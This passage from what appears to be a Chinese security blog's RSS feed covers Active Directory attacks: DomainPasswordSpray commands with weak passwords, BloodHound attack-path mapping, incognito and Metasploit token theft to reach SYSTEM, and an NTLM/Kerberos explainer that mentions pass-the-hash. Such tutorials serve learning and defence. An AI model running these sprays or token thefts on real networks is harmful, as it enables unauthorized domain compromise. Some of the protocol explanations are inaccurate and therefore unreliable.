&lt;p&gt;DomainPasswordSpray…psl 也可以进行密码喷洒攻击，该 PowerShell 脚本需要在域内机器上执行，默认情况下该脚本是利用 LDAP 从域中导出用户列表，去除被锁定的用户，用指定的密码进行喷洒。&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\DomainPasswordSpray&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Password 123456&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Password YUNyi123&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Userlist user&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Domain yunyi&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;password 123456 指定用户列表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235821942.png&#34; alt=&#34;image-20240310235821942&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235838927.png&#34; alt=&#34;image-20240310235838927&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235854193.png&#34; alt=&#34;image-20240310235854193&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/</guid>
            <title>BloodHound工具</title>
            <link>http://gyzero.shop/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/</link>
            <pubDate>Fri, 08 Mar 2024 16:46:43 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;BloodHound&lt;/strong&gt; 是一个基于单页 JavaScript 网页应用程序，构建在 Linkurious 之上，使用 Electron 编译，由 C# 数据收集器提供数据给 Neo4j 数据库。它利用图论来揭示 Active Directory 或 Azure 环境中隐藏且常常无意的关系&lt;/p&gt;
&lt;p&gt;攻击者可以使用 &lt;strong&gt;BloodHound&lt;/strong&gt; 轻松识别复杂的攻击路径，这些路径在其他情况下很难快速识别。防御者也可以使用 &lt;strong&gt;BloodHound&lt;/strong&gt; 来识别并消除这些攻击路径。无论是蓝队还是红队，都可以使用 &lt;strong&gt;BloodHound&lt;/strong&gt; 更深入地了解 Active Directory 或 Azure 环境中的权限关系&lt;/p&gt;
&lt;h3 id=&#34;neo4j-数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#neo4j-数据库&#34;&gt;#&lt;/a&gt; Neo4j 数据库&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;apt-get install neo4j&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装成功后启动&lt;/p&gt;
&lt;p&gt;&lt;code&gt;neo4j start&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308172653141.png&#34; alt=&#34;image-20240308172653141&#34;&gt;&lt;/p&gt;
&lt;p&gt;浏览器访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host : http://localhost:7474
Username : neo4j
Password : neo4j
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;安装bloodhound&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装bloodhound&#34;&gt;#&lt;/a&gt; 安装 BloodHound&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;https://github.com/BloodHoundAD/BloodHound/releases&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装完成后到目录下执行 &lt;code&gt;./BloodHound --no-sandbox&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输入 neo4j 设置的账号密码就可以进来了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308173248743.png&#34; alt=&#34;image-20240308173248743&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据收集&#34;&gt;#&lt;/a&gt; 数据收集&lt;/h3&gt;
&lt;p&gt;BloodHound 有；两个版本采集工具&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308173703965.png&#34; alt=&#34;image-20240308173703965&#34;&gt;&lt;/p&gt;
&lt;p&gt;SharpHound 是官方的数据收集器，用于 BloodHound。 这是写的 C# 和使用本地 Windows API 职能和 LDAP 名字空间的功能 收集的数据域控制器和加入域的 windows 系统。&lt;/p&gt;
&lt;p&gt;SharpHound 将自动确定什么领域当前用户 属于，找到一个域控制器，用于这一领域，并启动 &amp;quot;默认&amp;quot; 收集方法。 默认的收集方法将会收集的 下列信息域控制器：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安全组成员身份&lt;/li&gt;
&lt;li&gt;域信任&lt;/li&gt;
&lt;li&gt;Abusable 权利上的活动目录的对象&lt;/li&gt;
&lt;li&gt;小组政策的链接&lt;/li&gt;
&lt;li&gt;OU 树形结构&lt;/li&gt;
&lt;li&gt;几个属性，从计算机、小组和用户的对象&lt;/li&gt;
&lt;li&gt;SQL 管理的链接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，SharpHound 将尝试收集以下信息 从各个领域加入了 windows 计算机：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;成员的地方管理程序，分布 COM 和远程管理组&lt;/li&gt;
&lt;li&gt;活动的会议，其 SharpHound 将尝试相互关联的系统 用户交互式登录在&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当完成后，SharpHound 会创建这些类文件和将它们放入 一个压缩文件&lt;/p&gt;
&lt;p&gt;基本的使用&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SharpHound.exe &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; all&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行完毕后会生成一个 zip 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175014319.png&#34; alt=&#34;image-20240308175014319&#34;&gt;&lt;/p&gt;
&lt;p&gt;把这个文件导入到 BloodHound，把 zip 文件复制到 kali 点击 upload data&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175229654.png&#34; alt=&#34;image-20240308175229654&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175146642.png&#34; alt=&#34;image-20240308175146642&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308181338898.png&#34; alt=&#34;image-20240308181338898&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里三个模块分别是&lt;br&gt;
 1 、 Database Info （数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。&lt;br&gt;
2 、 Node Indo （节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。&lt;br&gt;
3 、 Analysis （分析查询），在 BloodHound 中预设了一些查询条件，具体如下：&lt;/p&gt;
&lt;p&gt;右键节点分别是&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308181635837.png&#34; alt=&#34;image-20240308181635837&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置为起始节点。&lt;br&gt;
设置为结束节点。&lt;br&gt;
到这里的最短路径。&lt;br&gt;
从拥有的到这里的最短路径。&lt;br&gt;
编辑节点。&lt;br&gt;
将组标记为拥有。&lt;br&gt;
将集团标记为高价值。&lt;br&gt;
删除节点&lt;/p&gt;
&lt;p&gt;Analysis 这里有一些预设好的查询&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308182140085.png&#34; alt=&#34;image-20240308182140085&#34;&gt;&lt;/p&gt;
&lt;p&gt;预构建的分析查询。&lt;br&gt;
域信息。&lt;br&gt;
查找所有域管理员。&lt;br&gt;
映射域信任。&lt;br&gt;
查找安装了不支持的操作系统的计算机。&lt;br&gt;
危险的特权。&lt;br&gt;
查找具有 DCSync 权限的主体。&lt;br&gt;
具有外部域组成员身份的用户。&lt;br&gt;
具有外部域组成员资格的组。&lt;br&gt;
查找域用户为本地管理员的计算机。&lt;br&gt;
查找域用户可以读取 LAPS 密码的计算机。&lt;br&gt;
查找从域用户到高价值目标的所有路径。&lt;br&gt;
查找域用户可以进行 RDP 的工作站。&lt;br&gt;
查找域用户可以进行 RDP 的服务器。&lt;br&gt;
查找域用户组的危险权限。&lt;br&gt;
查找非域控制器的域管理员登录。&lt;br&gt;
Kerberos 交互。&lt;br&gt;
查找高价值组的 Kerberoastable 成员。&lt;br&gt;
列出所有 Kerberoastable 帐户。&lt;br&gt;
查找具有最大权限的 Kerberoastable 用户。&lt;br&gt;
查找 AS-REP 可烘焙用户 (DontReqPreAuth)。&lt;br&gt;
最短路径。&lt;br&gt;
到无约束委托系统的最短路径。&lt;br&gt;
来自 Kerberoastable 用户的最短路径。&lt;br&gt;
从 Kerberoastable 用户到域管理员的最短路径。&lt;br&gt;
自拥有的校长的最短路径。&lt;br&gt;
从拥有的主体到域管理员的最短路径。&lt;br&gt;
通向高价值目标的最短路径。&lt;br&gt;
从域用户到高价值目标的最短路径。&lt;br&gt;
查找通向域管理员的最短路径&lt;/p&gt;
&lt;p&gt;官方文档&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://bloodhound.readthedocs.io/en/latest/further-reading/further-reading.html&lt;/code&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/07/network-security/neiwang/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/</guid>
            <title>Token窃取利用</title>
            <link>http://gyzero.shop/2024/03/07/network-security/neiwang/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/</link>
            <pubDate>Thu, 07 Mar 2024 19:56:32 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;什么是token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是token&#34;&gt;#&lt;/a&gt; 什么是 token&lt;/h3&gt;
&lt;p&gt;在 Windows 系统中，令牌是一种临时密钥，用于决定是否允许当前请求以及判断当前请求属于哪个用户。令牌包含用户安全标识符（SID）、权限列表等，这些令牌持续存在于系统中，除非系统重新启动。令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。&lt;/p&gt;
&lt;p&gt;访问令牌（Access Token）是描述进程或线程安全上下文的对象，包含与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将为用户生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。&lt;/p&gt;
&lt;p&gt;访问令牌包括：&lt;/p&gt;
&lt;figure class=&#34;highlight vhdl&#34;&gt;&lt;figcaption data-lang=&#34;VHDL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;授权令牌（Delegation Token），也叫主令牌，支持交互式会话登录（例如本地用户登录、远程桌面登录）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;模拟令牌（Impresonation Token）支持非交互的会话（例如使用 net &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt;访问共享文件夹）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;密保令牌（Security Token）是一种用于实现计算机身份校验的物理设备，例如 U 盾。&lt;/p&gt;
&lt;p&gt;会话令牌（Session Token）是交互会话中唯一的身份标识符。&lt;/p&gt;
&lt;p&gt;令牌窃取是一种 Windows 上的提权攻击技术，攻击者可以通过获取系统中一个高权限进程的安全令牌，然后将其注入到一个低权限进程中，使得低权限进程可以获得高权限进程的访问权限。例如，域管理员在域内某台普通主机上留下未清除的令牌，攻击者可窃取域管理员的令牌以提升权限，从而执行各种恶意操作。&lt;/p&gt;
&lt;p&gt;总之，令牌是 Windows 系统中用于控制访问权限的关键组件，了解其工作原理和安全性对于保护系统免受攻击至关重要。&lt;/p&gt;
&lt;h3 id=&#34;accesstoken-窃取与利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#accesstoken-窃取与利用&#34;&gt;#&lt;/a&gt; AccessToken 窃取与利用&lt;/h3&gt;
&lt;p&gt;前提是需要 administrator 管理员权限&lt;/p&gt;
&lt;h4 id=&#34;incognito利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#incognito利用&#34;&gt;#&lt;/a&gt; incognito 利用&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;incognito.exe list_tokens -u
#列出令牌
incognito.exe execute -c &amp;quot;NT AUTHORITY\SYSTEM&amp;quot; cmd.exe
#模拟system令牌切换到system权限
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309144127705.png&#34; alt=&#34;image-20240309144127705&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309144239453.png&#34; alt=&#34;image-20240309144239453&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;msf的incognito模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf的incognito模块&#34;&gt;#&lt;/a&gt; MSF 的 incognito 模块&lt;/h4&gt;
&lt;p&gt;获取到 shell 后进入 incognito&lt;/p&gt;
&lt;p&gt;use incognito&lt;/p&gt;
&lt;p&gt;列出 token&lt;/p&gt;
&lt;p&gt;list_tokens -u&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309151716077.png&#34; alt=&#34;image-20240309151716077&#34;&gt;&lt;/p&gt;
&lt;p&gt;impersonate_token “NT AUTHORITY\SYSTEM”&lt;/p&gt;
&lt;p&gt;模拟 system 令牌&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309152144858.png&#34; alt=&#34;image-20240309152144858&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;进程窃取token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进程窃取token&#34;&gt;#&lt;/a&gt; 进程窃取 token&lt;/h4&gt;
&lt;p&gt;查看进程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309152932815.png&#34; alt=&#34;image-20240309152932815&#34;&gt;&lt;/p&gt;
&lt;p&gt;steal_token 416&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309153206757.png&#34; alt=&#34;image-20240309153206757&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/win%E5%8D%8F%E8%AE%AE/</guid>
            <title>win协议认证知识</title>
            <link>http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/win%E5%8D%8F%E8%AE%AE/</link>
            <pubDate>Tue, 05 Mar 2024 14:48:19 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;ntlm协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm协议&#34;&gt;#&lt;/a&gt; NTLM 协议&lt;/h2&gt;
&lt;p&gt;NTLM（NT LAN Manager）是一套由微软开发的安全协议套件，用于在基于 Windows 的网络中进行身份验证、完整性和机密性保护。NTLM 最初是在上世纪 90 年代初引入的，经过多次修订以增强安全性和功能现在已经更新了 NTMLv2 和 kerberos 协议。&lt;/p&gt;
&lt;h3 id=&#34;ntlm-hash&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm-hash&#34;&gt;#&lt;/a&gt; NTLM HASH&lt;/h3&gt;
&lt;p&gt;NT LAN Manager&lt;/p&gt;
&lt;p&gt;长度为 32 位由数字字母组成是认证时的一个重要参照物&lt;/p&gt;
&lt;p&gt;在 windows 中我们的密码通常不是以明文形式传输，而是以哈希值的形式。例如我们设置密码为 admin 密码就会被哈希处理保存在 SAM 数据库中当用户登录时，其密码首先被哈希处理，然后与存储在系统中的哈希值进行比较。&lt;/p&gt;
&lt;p&gt;SAM 文件存储位置 &lt;code&gt;C:\Windows\System32\config\SAM&lt;/code&gt;  是需要系统管理员权限才可以访问查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305152021162.png&#34; alt=&#34;image-20240305152021162&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本地认证流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本地认证流程&#34;&gt;#&lt;/a&gt; 本地认证流程&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;用户登录&lt;/strong&gt;：当用户尝试登录到 Windows 系统时由 winlogon.exe 管理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;接收用户输入&lt;/strong&gt;：用户在登录界面输入用户名和密码。winlogon.exe 负责接收这些用户输入。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;验证用户凭据&lt;/strong&gt;：一旦用户输入了凭据，winlogon.exe 将这些凭据传递给 Local Security Authority Subsystem Service (LSASS)，也就是 lsass.exe。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;认证过程&lt;/strong&gt;: lsass.exe 将收到的用户凭据与本地存储的凭据进行比对，这些凭据通常以 NTLM hash 的形式存储在本地安全账户数据库中。lsass.exe 会使用 NTLM hash 算法来验证用户提供的凭据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;访问授权&lt;/strong&gt;：如果凭据验证成功，用户将被授权登录到系统，并获得相应的访问权限。如果验证失败，用户将被拒绝登录&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ntlm认证详细流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm认证详细流程&#34;&gt;#&lt;/a&gt; NTLM 认证详细流程&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;协商&lt;/strong&gt;：客户端和服务器协商使用的 NTLM 协议版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;挑战 / 响应&lt;/strong&gt;：服务器向客户端发送一个挑战，客户端以用户凭据的哈希版本进行响应。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;会话安全&lt;/strong&gt;：如果凭证被验证，将建立一个用于客户端和服务器之间安全通信的会话密钥。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;第一步先协商&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一步先协商&#34;&gt;#&lt;/a&gt; 第一步先协商&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;客户端发起连接请求，并包含支持的 NTLM 协议版本列表。&lt;/li&gt;
&lt;li&gt;服务器从客户端提供的列表中选择最高版本的 NTLM 协议 v1,v2 或者更早的 LM 协议，并向客户端发送选定的协议版本&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;第二步挑战响应&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二步挑战响应&#34;&gt;#&lt;/a&gt; 第二步挑战 / 响应&lt;/h4&gt;
&lt;p&gt;首先服务端接收到来自客服端的用户名 test，然后查询本地账户有没有这个 test 用户&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有的话返回认证失败&lt;/p&gt;
&lt;p&gt;有的话认证通过&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着服务端生成一个 Challenge 这是一个 16 字节的随机数每次都不同，然后找到 test 的 NTLM HASH 值并用这个加密 Challenge&lt;/p&gt;
&lt;p&gt;生成一个 net-NTLM-HASH 存在内存中&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;将 Challenge 发送给客户端&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;客户端接收到 Challenge 后将 test 的密码转换为 NTMLHASH 然后对 Challenge 加密生成响应 response 也就是 net-NTLM-HASH&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;客户端的 response 发送给服务端&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;服务端收到 response 后与之前的 net-NTLM-HASH 进行比较如果相同的话认证通过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;认证通过&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;ntlmv1和v2区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlmv1和v2区别&#34;&gt;#&lt;/a&gt; NTLMv1 和 v2 区别&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;安全性&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;NTLMv1: NTLMv1 使用较弱的密码哈希算法（如 LM hash 和 NTLM hash），并且缺乏足够的随机性和安全性措施。它容易受到中间人攻击、字典攻击和重放攻击的影响。&lt;/li&gt;
&lt;li&gt;NTLMv2: NTLMv2 引入了更强大的密码哈希算法，通常是使用更安全的算法，如 MD5 或 SHA-256。它还引入了更多的随机性和安全性措施，例如使用更复杂的挑战 / 响应过程，增加了消息完整性检查等。这使得 NTLMv2 比 NTLMv1 更难以被破解和攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;消息结构&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;NTLMv1: NTLMv1 的消息结构相对简单，通常包括挑战和响应等基本部分。它的消息格式不够复杂，容易受到中间人攻击和重放攻击的影响。&lt;/li&gt;
&lt;li&gt;NTLMv2: NTLMv2 引入了更复杂的消息结构，包括更多的字段和数据元素。它的消息结构更复杂，包含更多的随机数和安全性相关的字段，使得攻击者更难以破解或篡改通信内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;兼容性&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;NTLMv1: 尽管 NTLMv1 已被证明存在较大的安全风险，但仍然存在一些环境和遗留系统可能仍在使用 NTLMv1。一些旧版的 Windows 系统和应用程序仍然可能使用 NTLMv1，因此在某些情况下可能无法完全避免。&lt;/li&gt;
&lt;li&gt;NTLMv2: NTLMv2 是更安全的选项，但需要双方都支持才能正常使用。在较新的 Windows 系统和网络环境中，NTLMv2 通常被推荐和优先使用，以提高系统的安全性和兼容性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ntlm-hash的安全问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm-hash的安全问题&#34;&gt;#&lt;/a&gt; NTLM-HASH 的安全问题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;弱密码哈希&lt;/strong&gt;：NTLM Hash 使用的是较旧的哈希算法（如 MD4 或 MD5），这些算法已经被证明不安全，容易受到字典攻击、暴力破解等攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;单向散列&lt;/strong&gt;：NTLM Hash 是单向散列，即从密码计算出 Hash 值很容易，但从 Hash 值反推出原始密码非常困难。这导致了在没有盐（salt）的情况下，使用彩虹表等预先计算好的 Hash 值进行破解的可能性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;：NTLM 协议本身容易受到中间人攻击的影响。攻击者可以拦截 NTLM 挑战 - 响应消息，并使用这些消息来模拟客户端与服务器之间的通信，从而获得对目标系统的访问权限。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Pass The Hash 攻击&lt;/strong&gt;：攻击者可以获取到 NTLM Hash 后，直接使用这个 Hash 进行身份验证，而无需知道用户的明文密码&lt;/p&gt;
&lt;h2 id=&#34;kerberos协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberos协议&#34;&gt;#&lt;/a&gt; Kerberos 协议&lt;/h2&gt;
&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通过系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的（如：共享密钥）执行认证服务的。&lt;/p&gt;
&lt;p&gt;麻省理工研发了 Kerberos 协议来保护 Project Athena 提供的网络服务器。这个协议以希腊神话中的人物 Kerberos 命名，他是一条凶猛的三头保卫神犬&lt;/p&gt;
&lt;h3 id=&#34;kerberos一些术语&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberos一些术语&#34;&gt;#&lt;/a&gt; kerberos 一些术语&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;AS（Authentication Server）- 认证服务器&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;AS 是 Kerberos 协议中的组件，用于对用户进行身份验证。它负责接收用户的认证请求，并在验证用户身份后向用户颁发 TGT。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;KDC（Key Distribution Center）- 密钥分发中心&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;KDC 是 Kerberos 协议中的总称，由 AS 和 TGS 组成。KDC 通常指的是单个服务器，同时扮演 AS 和 TGS 的角色。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TGT（Ticket Granting Ticket）- 票据授权票据&lt;/strong&gt;：
&lt;ul&gt;
